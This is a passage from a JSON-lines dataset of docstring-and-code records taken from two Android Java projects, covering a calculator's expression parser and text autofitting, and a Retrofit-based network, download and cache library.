Complex(constValue);\n            }\n        }\n\n        if (complexConst != null) {\n            interpretResult[l].submit(r, SymbolCachePair.SYMBOL_CONST, complexConst);\n            return new Result(complexConst);\n        }\n    }\n\n    // Number parsing\n    try {\n        // Forbid default real values and char e as a operator\n        // Forbid default notations\n        if (s.indexOf('e') >= 0 || s.indexOf('I') >= 0 || s.indexOf('N') >= 0 ||\n                s.indexOf('X') >= 0 || s.indexOf('P') >= 0 || s.indexOf('x') >= 0 || s.indexOf('p') >= 0) {\n            throw new NumberFormatException();\n        }\n\n        try { // try parse decimal double\n            if (s.indexOf('D') >= 0 || s.indexOf('F') >= 0) { // forbid double and float sign\n                throw new NumberFormatException();\n            }\n\n            double v = Double.parseDouble(s);\n            interpretResult[l].submit(r, SymbolCachePair.SYMBOL_NUM, new Complex(v));\n            return new Result(new Complex(v));\n        } catch (NumberFormatException e) { // try parse double under a base\n            // Not a valid dec Double\n            double v = ParseNumber.parse(s);\n            interpretResult[l].submit(r, SymbolCachePair.SYMBOL_NUM, new Complex(v));\n            return new Result(new Complex(v));\n        }\n    } catch (NumberFormatException e) {\n        // Not a valid Number\n    }\n\n    char ci;\n    // Addition and Subtraction\n    for (int i = r; i > l; i--) {\n        ci = text.charAt(i);\n        // Only ONE of the following long boolean expression will be calculated\n        if (br[i] == br[l] && isAddSubSymbol(i)) {\n            if (ci == '+') {\n                interpretResult[l].submit(r, SymbolCachePair.SYMBOL_ADD, i);\n                Result r1 = value(l, i - 1, vX);\n                if (r1.isFatalError()) return r1;\n                Result r2 = value(i + 1, r, vX);\n                if (r2.isFatalError()) return r2;\n                return new Result(Complex.add(r1.val, r2.val));\n            } else if (ci == '-') {\n                interpretResult[l].submit(r, SymbolCachePair.SYMBOL_SUB, i);\n                Result r1 = value(l, i - 1, vX);\n                if (r1.isFatalError()) return r1;\n                Result r2 = value(i + 1, r, vX);\n                if (r2.isFatalError()) return r2;\n                return new Result(Complex.sub(r1.val, r2.val));\n            }\n        }\n    }\n\n    // Unary operator: positive and negative\n    if (text.charAt(l) == '+') {\n        interpretResult[l].submit(r, SymbolCachePair.SYMBOL_POS, -1);\n        return value(l + 1, r, vX);\n    } else if (text.charAt(l) == '-') {\n        interpretResult[l].submit(r, SymbolCachePair.SYMBOL_NEG, -1);\n        Result r1 = value(l + 1, r, vX);\n        if (r1.isFatalError()) return r1;\n        return new Result(Complex.inv(r1.val));\n    }\n\n    // Multiplication and Division\n    for (int i = r; i > l; i--) {\n        if (br[i] == br[l]) {\n            ci = text.charAt(i);\n            Result r1, r2;\n            switch (ci) {\n                case '*':\n                case '\u2022':\n                    interpretResult[l].submit(r, SymbolCachePair.SYMBOL_MUL, i);\n                    r1 = value(l, i - 1, vX);\n                    if (r1.isFatalError()) return r1;\n                    r2 = value(i + 1, r, vX);\n                    if (r2.isFatalError()) return r2;\n                    return new Result(Complex.mul(r1.val, r2.val));\n                case '/':\n                    interpretResult[l].submit(r, SymbolCachePair.SYMBOL_DIV, i);\n                    r1 = value(l, i - 1, vX);\n                    if (r1.isFatalError()) return r1;\n                    r2 = value(i + 1, r, vX);\n                    if (r2.isFatalError()) return r2;\n                    return new Result(Complex.div(r1.val, r2.val));\n                case '!':\n                    interpretResult[l].submit(r, SymbolCachePair.SYMBOL_FACT, i);\n                    r1 = value(l, i - 1, vX);\n                    if (r1.isFatalError()) return r1;\n                    if (i != r)\n                        return new Result(1).setAnswer(\"\u65e0\u6cd5\u8ba1\u7b97 \u201c\" + s + \"\u201d\");\n                    if (r1.val.re % 1 != 0 || r1.val.re < 0)\n                        return new Result(1).setAnswer(\"\u9636\u4e58\u53ea\u80fd\u4f5c\u7528\u4e8e\u81ea\u7136\u6570\");\n                    return fact(r1.val);\n                default:\n                    if (isOmitMult(i)) { // * symbol omission\n                        interpretResult[l].submit(r, SymbolCachePair.SYMBOL_MUL_OMIT, i);\n                        r1 = value(l, i - 1, vX);\n                        if (r1.isFatalError()) return r1;\n                        r2 = value(i, r, vX);\n                        if (r2.isFatalError()) return r2;\n                        return new Result(Complex.mul(r1.val, r2.val));\n                    }\n            }\n        }\n    }\n\n    // Power (priority right->left)\n    for (int i = l; i <= r; i++)\n        if (br[i] == br[l] && text.charAt(i) == '^') {\n            interpretResult[l].submit(r, SymbolCachePair.SYMBOL_POW, i);\n            Result r1 = value(l, i - 1, vX);\n            if (r1.isFatalError()) return r1;\n            Result r2 = value(i + 1, r, vX);\n            if (r2.isFatalError()) return r2;\n            return new Result(Complex.pow(r1.val, r2.val));\n        }\n\n    // Sqrt symbol\n    if (text.charAt(l) == '\u221a') {\n        interpretResult[l].submit(r, SymbolCachePair.SYMBOL_SQRT, -1);\n        Result r1 = value(l + 1, r, vX);\n        if (r1.isFatalError()) return r1;\n        return new Result(Complex.sqrt(r1.val));\n    }\n\n    // Brackets\n    if (text.charAt(r) != ')')\n        return new Result(1).setAnswer(\"\u65e0\u6cd5\u8ba1\u7b97 \u201c\" + s + \"\u201d\");\n    if (text.charAt(l) == '(') {\n        interpretResult[l].submit(r, SymbolCachePair.SYMBOL_BRACKET, -1);\n        return value(l + 1, r - 1, vX);\n    }\n\n    // parse function\n    interpretResult[l].submit(r, SymbolCachePair.SYMBOL_FUNC, -1);\n    return funcValue(l, r, vX);\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Re-sizes the textSize of the TextView so that the text fits within the bounds of the View.\n */\n", "func_signal": "private static void autofit(TextView view, TextPaint paint, float minTextSize, float maxTextSize,\n                            int maxLines, float precision)", "code": "{\n    if (maxLines <= 0 || maxLines == Integer.MAX_VALUE) {\n        // Don't auto-size since there's no limit on lines.\n        return;\n    }\n\n    int targetWidth = view.getWidth() - view.getPaddingLeft() - view.getPaddingRight();\n    if (targetWidth <= 0) {\n        return;\n    }\n\n    CharSequence text = view.getText();\n    TransformationMethod method = view.getTransformationMethod();\n    if (method != null) {\n        text = method.getTransformation(text, view);\n    }\n\n    Context context = view.getContext();\n    Resources r = Resources.getSystem();\n    DisplayMetrics displayMetrics;\n\n    float size = maxTextSize;\n    float high = size;\n    float low = 0;\n\n    if (context != null) {\n        r = context.getResources();\n    }\n    displayMetrics = r.getDisplayMetrics();\n\n    paint.set(view.getPaint());\n    paint.setTextSize(size);\n\n    if ((maxLines == 1 && paint.measureText(text, 0, text.length()) > targetWidth)\n            || getLineCount(text, paint, size, targetWidth, displayMetrics) > maxLines) {\n        size = getAutofitTextSize(text, paint, targetWidth, maxLines, low, high, precision,\n                displayMetrics);\n    }\n\n    if (size < minTextSize) {\n        size = minTextSize;\n    }\n\n    view.setTextSize(TypedValue.COMPLEX_UNIT_PX, size);\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// only used when text[p]=='+'/'-' && p>0\n", "func_signal": "private boolean isAddSubSymbol(int p)", "code": "{\n    if (p == 0) return false;\n\n    char cj = text.charAt(p);\n    if (!(cj == '+' || cj == '-')) {\n        return false;\n    }\n\n    cj = text.charAt(p - 1);\n    if (isOperator(cj) || cj == 'E') {\n        return false;\n    }\n    if (ParseNumber.isBaseSymbol(cj)) { // a pos/neg symbol in scientific notation under certain base\n        int pos;\n        for (pos = p + 1; pos < text.length(); pos++) {\n            cj = text.charAt(pos);\n            if (!(cj >= '0' && cj <= '9')) { // not a decimal number\n                break;\n            }\n        }\n        if (pos == text.length()) { // parsed to an end\n            return false;\n        }\n        if (pos == p + 1) { // '+/-' directly followed by non-integer symbol\n            return true;\n        }\n        if (ParseNumber.isBaseSymbol(cj) || (cj >= 'A' && cj <= 'F') || cj == '.') { // part of another notation\n            return true;\n        }\n        return false;\n    }\n    return true;\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// print the value of d under base to a string with prec digits' precision\n", "func_signal": "public static String toBaseString(double d_, int base, int prec)", "code": "{\n    if (Double.isNaN(d_)) return \"nan\";\n    if (d_ == Double.POSITIVE_INFINITY) return \"\u221e\";\n    if (d_ == Double.NEGATIVE_INFINITY) return \"-\u221e\";\n\n    String negativeSymbol = (d_ >= 0 ? \"\" : \"-\");\n    double d = Math.abs(d_);\n    double maxPreciseValue = Math.pow(base, prec);\n    double minPreciseValue = Math.pow(base, -prec);\n\n    if (d < maxPreciseValue && d > minPreciseValue) { // able to express under fixed precision\n        return negativeSymbol + toPositiveRawBaseString(d, base, prec) + (base == 10 ? \"\" : baseSymbol.charAt(base));\n    } else { // need scientific notation\n        double fracPart = d;\n        int digitExp = 0;\n        while (fracPart >= base) {\n            digitExp++;\n            fracPart /= base;\n        }\n        while (fracPart < 1) {\n            digitExp--;\n            fracPart *= base;\n        }\n\n        String res = toPositiveRawBaseString(fracPart, base, prec) + (base == 10 ? \"E\" : baseSymbol.charAt(base));\n        res += digitExp;\n        return negativeSymbol + res;\n    }\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\ParseNumber.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// general limit\n", "func_signal": "public Result limit(int l, int r, Complex x0)", "code": "{\n\n    // Responsibility recharge\n    if (Double.isInfinite(x0.re)) { // to real infinity\n        return limit(l, r, x0, new Complex(x0.re > 0 ? 1 : -1));\n    }\n    if (Double.isInfinite(x0.im)) { // to imaginary infinity\n        return limit(l, r, x0, new Complex(0, x0.im > 0 ? 1 : -1));\n    }\n\n    final int sect = 8;\n    final double sectAngle = Math.PI / sect;\n    Complex[] limitRes = new Complex[sect];\n    Complex limitSum = new Complex(0);\n    double limitVar = 0;\n    int validSect = 0;\n\n    for (int i = 0; i < sect; i++) { // find directions in [0,pi)\n\n        List<Complex> histRes = new ArrayList<>();\n        double minDe = 1E200;\n        int minPos = -1;\n\n        int cnt = 0;\n        int overErrorRangeCount = 0;\n        double h;\n        for (h = 1E-1; h >= 1E-10; h *= 0.9, cnt++) {\n            Complex delta = new Complex(Math.cos(i * sectAngle) * h, Math.sin(i * sectAngle) * h);\n            Result resR = limitH(l, r, x0, delta);\n            if (resR.isFatalError()) return new Result(1).setAnswer(\"\u672a\u627e\u5230\u6781\u9650\");\n            Complex res = resR.val;\n\n            if (cnt > 0) {\n                double e = Complex.sub(res, histRes.get(cnt - 1)).norm().re;\n\n                if (e < minDe) {\n                    overErrorRangeCount = 0;\n                    minDe = e;\n                    minPos = cnt;\n                } else { // e >= minDe or e is NaN!\n                    overErrorRangeCount++;\n                }\n                if (overErrorRangeCount > 20) {\n                    break;\n                }\n            }\n\n            histRes.add(res);\n        }\n\n        if (minDe > 1E-5) { // didn't found ?\n            new Result(-1).setAnswer(\"\u51fd\u6570\u53ef\u80fd\u6ca1\u6709\u6536\u655b\");\n        } else { // found\n            Complex minRes = histRes.get(minPos - 1);\n            limitSum = Complex.add(limitSum, minRes);\n            limitRes[validSect] = minRes;\n            validSect++;\n        }\n    }\n\n    if (validSect == 0) return new Result(1).setAnswer(\"\u672a\u627e\u5230\u6781\u9650\");\n\n    limitSum.re /= validSect;\n    limitSum.im /= validSect;\n    for (int i = 0; i < validSect; i++) {\n        limitVar += Complex.sub(limitRes[i], limitSum).norm2();\n    }\n\n    Result res = new Result(limitSum);\n    if (limitVar > 1E-5) {\n        res.append(\"\u51fd\u6570\u53ef\u80fd\u6ca1\u6709\u6536\u655b\u5230\u9884\u671f\u7cbe\u5ea6\");\n    }\n\n    return res;\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Set the maximum text size to a given unit and value. See TypedValue for the possible\n * dimension units.\n *\n * @param unit The desired dimension unit.\n * @param size The desired size in the given units.\n * @attr ref android.R.styleable#TextView_textSize\n */\n", "func_signal": "public AutofitHelper setMaxTextSize(int unit, float size)", "code": "{\n    Context context = mTextView.getContext();\n    Resources r = Resources.getSystem();\n\n    if (context != null) {\n        r = context.getResources();\n    }\n\n    setRawMaxTextSize(TypedValue.applyDimension(unit, size, r.getDisplayMetrics()));\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Recursive binary search to find the best size for the text.\n */\n", "func_signal": "private static float getAutofitTextSize(CharSequence text, TextPaint paint,\n                                        float targetWidth, int maxLines, float low, float high, float precision,\n                                        DisplayMetrics displayMetrics)", "code": "{\n    float mid = (low + high) / 2.0f;\n    int lineCount = 1;\n    StaticLayout layout = null;\n\n    paint.setTextSize(TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_PX, mid,\n            displayMetrics));\n\n    if (maxLines != 1) {\n        layout = new StaticLayout(text, paint, (int) targetWidth, Layout.Alignment.ALIGN_NORMAL,\n                1.0f, 0.0f, true);\n        lineCount = layout.getLineCount();\n    }\n\n    if (SPEW) Log.d(TAG, \"low=\" + low + \" high=\" + high + \" mid=\" + mid +\n            \" target=\" + targetWidth + \" maxLines=\" + maxLines + \" lineCount=\" + lineCount);\n\n    if (lineCount > maxLines) {\n        // For the case that `text` has more newline characters than `maxLines`.\n        if ((high - low) < precision) {\n            return low;\n        }\n        return getAutofitTextSize(text, paint, targetWidth, maxLines, low, mid, precision,\n                displayMetrics);\n    } else if (lineCount < maxLines) {\n        return getAutofitTextSize(text, paint, targetWidth, maxLines, mid, high, precision,\n                displayMetrics);\n    } else {\n        float maxLineWidth = 0;\n        if (maxLines == 1) {\n            maxLineWidth = paint.measureText(text, 0, text.length());\n        } else {\n            for (int i = 0; i < lineCount; i++) {\n                if (layout.getLineWidth(i) > maxLineWidth) {\n                    maxLineWidth = layout.getLineWidth(i);\n                }\n            }\n        }\n\n        if ((high - low) < precision) {\n            return low;\n        } else if (maxLineWidth > targetWidth) {\n            return getAutofitTextSize(text, paint, targetWidth, maxLines, low, mid, precision,\n                    displayMetrics);\n        } else if (maxLineWidth < targetWidth) {\n            return getAutofitTextSize(text, paint, targetWidth, maxLines, mid, high, precision,\n                    displayMetrics);\n        } else {\n            return mid;\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * @see TextView#setMaxLines(int)\n */\n", "func_signal": "public AutofitHelper setMaxLines(int lines)", "code": "{\n    if (mMaxLines != lines) {\n        mMaxLines = lines;\n\n        autofit();\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * \u8ba2\u9605\u5f00\u59cb\u65f6\u8c03\u7528\n * \u663e\u793aProgressDialog\n */\n", "func_signal": "@Override\npublic void onStart()", "code": "{\n    showProgressDialog();\n    /*\u7f13\u5b58\u5e76\u4e14\u6709\u7f51*/\n    if (api.isCache() && AppUtil.isNetworkAvailable(RxRetrofitApp.getApplication())) {\n         /*\u83b7\u53d6\u7f13\u5b58\u6570\u636e*/\n        CookieResulte cookieResulte = CookieDbUtil.getInstance().queryCookieBy(api.getUrl());\n        if (cookieResulte != null) {\n            long time = (System.currentTimeMillis() - cookieResulte.getTime()) / 1000;\n            if (time < api.getCookieNetWorkTime()) {\n                if (mSubscriberOnNextListener.get() != null) {\n                    mSubscriberOnNextListener.get().onCacheNext(cookieResulte.getResulte());\n                }\n                onCompleted();\n                unsubscribe();\n            }\n        }\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u63cf\u8ff0\uff1a\u5224\u65ad\u7f51\u7edc\u662f\u5426\u6709\u6548.\n *\n * @return true, if is network available\n */\n", "func_signal": "public static boolean isNetworkAvailable(Context context)", "code": "{\n    try {\n        ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);\n        if (connectivity != null) {\n            NetworkInfo info = connectivity.getActiveNetworkInfo();\n            if (info != null && info.isConnected()) {\n                if (info.getState() == NetworkInfo.State.CONNECTED) {\n                    return true;\n                }\n            }\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return false;\n    }\n    return false;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\AppUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u6784\u9020\n *\n * @param api\n */\n", "func_signal": "public ProgressSubscriber(BaseApi api)", "code": "{\n    this.api = api;\n    this.mSubscriberOnNextListener = api.getListener();\n    this.mActivity = new SoftReference<>(api.getRxAppCompatActivity());\n    setShowPorgress(api.isShowProgress());\n    if (api.isShowProgress()) {\n        initProgressDialog(api.isCancel());\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u663e\u793a\u52a0\u8f7d\u6846\n */\n", "func_signal": "private void showProgressDialog()", "code": "{\n    if (!isShowPorgress()) return;\n    Context context = mActivity.get();\n    if (pd == null || context == null) return;\n    if (!pd.isShowing()) {\n        pd.show();\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u9690\u85cf\n */\n", "func_signal": "private void dismissProgressDialog()", "code": "{\n    if (!isShowPorgress()) return;\n    if (pd != null && pd.isShowing()) {\n        pd.dismiss();\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u5bf9\u9519\u8bef\u8fdb\u884c\u7edf\u4e00\u5904\u7406\n * \u9690\u85cfProgressDialog\n *\n * @param e\n */\n", "func_signal": "@Override\npublic void onError(Throwable e)", "code": "{\n    if(mSubscriberOnNextListener.get()!=null){\n        mSubscriberOnNextListener.get().onError(e);\n    }\n    HttpDownManager.getInstance().remove(downInfo);\n    downInfo.setState(DownState.ERROR);\n    DbDownUtil.getInstance().update(downInfo);\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressDownSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/*\u9519\u8bef\u7edf\u4e00\u5904\u7406*/\n", "func_signal": "private void errorDo(Throwable e)", "code": "{\n    Context context = mActivity.get();\n    if (context == null) return;\n    if (e instanceof SocketTimeoutException) {\n        Toast.makeText(context, \"\u7f51\u7edc\u4e2d\u65ad\uff0c\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u72b6\u6001\", Toast.LENGTH_SHORT).show();\n    } else if (e instanceof ConnectException) {\n        Toast.makeText(context, \"\u7f51\u7edc\u4e2d\u65ad\uff0c\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u72b6\u6001\", Toast.LENGTH_SHORT).show();\n    } else {\n        Toast.makeText(context, \"\u9519\u8bef\" + e.getMessage(), Toast.LENGTH_SHORT).show();\n    }\n    if (mSubscriberOnNextListener.get() != null) {\n        mSubscriberOnNextListener.get().onError(e);\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u8f6c\u6362\u9519\u8bef\u6570\u636e\n *\n * @param code\n * @return\n */\n", "func_signal": "private static String getApiExceptionMessage(int code)", "code": "{\n    String message = \"\";\n    switch (code) {\n        case NO_DATA:\n            message = \"\u65e0\u6570\u636e\";\n            break;\n        default:\n            message = \"error\";\n            break;\n\n    }\n    return message;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\exception\\HttpTimeException.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u8ba2\u9605\u5f00\u59cb\u65f6\u8c03\u7528\n * \u663e\u793aProgressDialog\n */\n", "func_signal": "@Override\npublic void onStart()", "code": "{\n    if(mSubscriberOnNextListener.get()!=null){\n        mSubscriberOnNextListener.get().onStart();\n    }\n    downInfo.setState(DownState.START);\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressDownSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u5c06onNext\u65b9\u6cd5\u4e2d\u7684\u8fd4\u56de\u7ed3\u679c\u4ea4\u7ed9Activity\u6216Fragment\u81ea\u5df1\u5904\u7406\n *\n * @param t \u521b\u5efaSubscriber\u65f6\u7684\u6cdb\u578b\u7c7b\u578b\n */\n", "func_signal": "@Override\npublic void onNext(T t)", "code": "{\n    if (mSubscriberOnNextListener.get() != null) {\n        mSubscriberOnNextListener.get().onNext(t);\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressDownSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u521d\u59cb\u5316\u52a0\u8f7d\u6846\n */\n", "func_signal": "private void initProgressDialog(boolean cancel)", "code": "{\n    Context context = mActivity.get();\n    if (pd == null && context != null) {\n        pd = new ProgressDialog(context);\n        pd.setCancelable(cancel);\n        if (cancel) {\n            pd.setOnCancelListener(new DialogInterface.OnCancelListener() {\n                @Override\n                public void onCancel(DialogInterface dialogInterface) {\n                    if (mSubscriberOnNextListener.get() != null) {\n                        mSubscriberOnNextListener.get().onCancel();\n                    }\n                    onCancelProgress();\n                }\n            });\n        }\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u83b7\u53d6\u53ef\u8bfb\u6570\u636e\u5e93\n */\n", "func_signal": "private SQLiteDatabase getReadableDatabase()", "code": "{\n    if (openHelper == null) {\n        openHelper = new DaoMaster.DevOpenHelper(context, dbName, null);\n    }\n    SQLiteDatabase db = openHelper.getReadableDatabase();\n    return db;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\DbDownUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u5b8c\u6210\uff0c\u9690\u85cfProgressDialog\n */\n", "func_signal": "@Override\npublic void onCompleted()", "code": "{\n    if(mSubscriberOnNextListener.get()!=null){\n        mSubscriberOnNextListener.get().onComplete();\n    }\n    HttpDownManager.getInstance().remove(downInfo);\n    downInfo.setState(DownState.FINISH);\n    DbDownUtil.getInstance().update(downInfo);\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressDownSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u83b7\u53d6\u5355\u4f8b\n * @return\n */\n", "func_signal": "public static DbDownUtil getInstance()", "code": "{\n    if (db == null) {\n        synchronized (DbDownUtil.class) {\n            if (db == null) {\n                db = new DbDownUtil();\n            }\n        }\n    }\n    return db;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\DbDownUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u8bfb\u53d6baseurl\n * @param url\n * @return\n */\n", "func_signal": "public static String getBasUrl(String url)", "code": "{\n    String head = \"\";\n    int index = url.indexOf(\"://\");\n    if (index != -1) {\n        head = url.substring(0, index + 3);\n        url = url.substring(index + 3);\n    }\n    index = url.indexOf(\"/\");\n    if (index != -1) {\n        url = url.substring(0, index + 1);\n    }\n    return head + url;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\AppUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u626b\u63cf\u7f13\u5b58\u7684\u65b9\u6cd5\n */\n", "func_signal": "private void scanCache()", "code": "{\n    new Thread(){\n        public void run() {\n            PackageManager pm = getPackageManager();\n            List<PackageInfo> packInfos = pm.getInstalledPackages(0);\n            pb.setMax(packInfos.size());\n            int total = 0;\n            for(PackageInfo packinfo:packInfos){\n                String packname = packinfo.packageName;\n                try {\n                    Method method = PackageManager.class.getMethod(\"getPackageSizeInfo\", String.class,IPackageStatsObserver.class);\n                    method.invoke(pm, packname,new MyObserver());\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                final String appname = packinfo.applicationInfo.loadLabel(pm).toString();\n                runOnUiThread(new Runnable() {\n\n                    @Override\n                    public void run() {\n                        tv_status.setText(\"\u6b63\u5728\u626b\u63cf\uff1a\"+appname);\n                    }\n                });\n                total++;\n                pb.setProgress(total);\n                try {\n                    Thread.sleep(30);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            runOnUiThread(new Runnable() {\n                @Override\n                public void run() {\n                    tv_status.setText(\"\u626b\u63cf\u5b8c\u6bd5\uff01\");\n                }\n            });\n        };\n    }.start();\n}", "path": "app\\src\\main\\java\\com\\example\\ggxiaozhi\\store\\the_basket\\mvp\\view\\activity\\CleanCacheActivity.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u5199\u5165\u6587\u4ef6\n * @param file\n * @param info\n * @throws IOException\n */\n", "func_signal": "public  static  void writeCache(ResponseBody responseBody, File file, DownInfo info) throws IOException", "code": "{\n    if (!file.getParentFile().exists())\n        file.getParentFile().mkdirs();\n    long allLength;\n    if (info.getCountLength()==0){\n        allLength=responseBody.contentLength();\n    }else{\n        allLength=info.getCountLength();\n    }\n    /**\n     * FileChannel \u4f18\u52bf\uff1a\n     \u591a\u7ebf\u7a0b\u5e76\u53d1\u8bfb\u5199\uff0c\u5e76\u53d1\u6027\uff1b\n     IO\u8bfb\u5199\u6027\u80fd\u63d0\u9ad8\uff08OS\u8d1f\u8d23\uff09\uff0c\u4e5f\u53ef\u5f15\u505a\u5171\u4eab\u5185\u5b58\uff0c\u51cf\u5c11IO\u64cd\u4f5c\uff0c\u63d0\u5347\u5e76\u53d1\u6027\uff1b\n     \u5e94\u7528crash\uff0c\u4fdd\u8bc1\u8fd9\u90e8\u5206\u5185\u5bb9\u8fd8\u80fd\u5199\u7684\u8fdb\u53bb\u6587\u4ef6\u3002\u5728\u6211\u4eec\u8c03\u7528channel.write(bytebuffer)\u4e4b\u540e\uff0c\n     \u5177\u4f53\u4f55\u65f6\u5199\u5165\u78c1\u76d8\u3001bytebuffer\u4e2d\u5185\u5bb9\u6682\u5b58\u4e8e\u54ea\u91cc\uff08os cache\uff09\u7b49\u76f8\u5173\u4e00\u7cfb\u5217\u95ee\u9898\uff0c\u5c31\u4ea4\u7531OS\u672c\u8eab\u8d1f\u8d23\u4e86\n     */\n    FileChannel channelOut = null;\n    RandomAccessFile randomAccessFile = null;\n    randomAccessFile = new RandomAccessFile(file, \"rwd\");\n    channelOut = randomAccessFile.getChannel();\n    MappedByteBuffer mappedBuffer = channelOut.map(FileChannel.MapMode.READ_WRITE,\n            info.getReadLength(),allLength-info.getReadLength());\n    byte[] buffer = new byte[1024*8];\n    int len;\n    int record = 0;\n    while ((len = responseBody.byteStream().read(buffer)) != -1) {\n        mappedBuffer.put(buffer, 0, len);\n        record += len;\n    }\n    responseBody.byteStream().close();\n    if (channelOut != null) {\n        channelOut.close();\n    }\n    if (randomAccessFile != null) {\n        randomAccessFile.close();\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\AppUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
